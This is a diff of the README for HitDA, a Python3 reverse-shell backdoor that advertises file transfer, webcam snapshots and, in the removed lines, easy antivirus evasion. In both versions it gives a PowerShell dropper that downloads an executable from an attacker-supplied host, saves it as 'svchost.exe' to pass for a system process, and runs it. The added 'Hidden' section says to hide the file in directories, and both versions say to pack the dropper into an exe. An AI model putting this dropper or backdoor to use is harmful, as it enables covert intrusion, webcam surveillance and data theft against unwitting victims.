@@ -1,9 +1,7 @@
 # HitDA
-HitDA is a Multi-Function backdoor based on TCP Reverse Shell write in Python3 for Kali Linux.
-It is easy to bypass the **AV-Software**.In addition to the basic reverse shell function
-, you can also use some powerful functions which are similar to Meterpreter.
-Like **File Download/Upload**, **Webcam snapshot**, I will continue to add more function
- later.
+This is a backdoor application based on TCP Reverse Shell write in Python3.
+(Not shellcode).In addition to the basic reverse shell function
+, you can also use some functions, Like **File Download/Upload**, **Webcam snapshot**.
  
 ## Setup
 ````
@@ -74,20 +72,17 @@ author: HalukShan
 || [9] Exit                                              ||
  =========================================================
 ```
-When you choose 0, you can choose the platform you want, and choose the script with webcam snap function
-or not, the webcam function will increase the script size to about
-**50MB**, otherwise, it's about **5MB**. 
 
-You can also use the **powershell** 
-script to automate download the script and execute, it will be more
-anonymous and customizable. Like:
+### Hidden
+You can use the **powershell** 
+script to automate download the script and hide in some directorys, then execute
 ````
 mkdir C:\tmp
 cd C:\tmp
 powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://youripordomain/script.exe','svchost.exe');
 svchost.exe
 ````
-Save as .bat file, and use battoexe to generate a small exe file.
+Save as .bat file, and use **battoexe** to generate a small exe file.
 
 ### Listening
 Choose option 1 to start the listening mode, enter your listening host
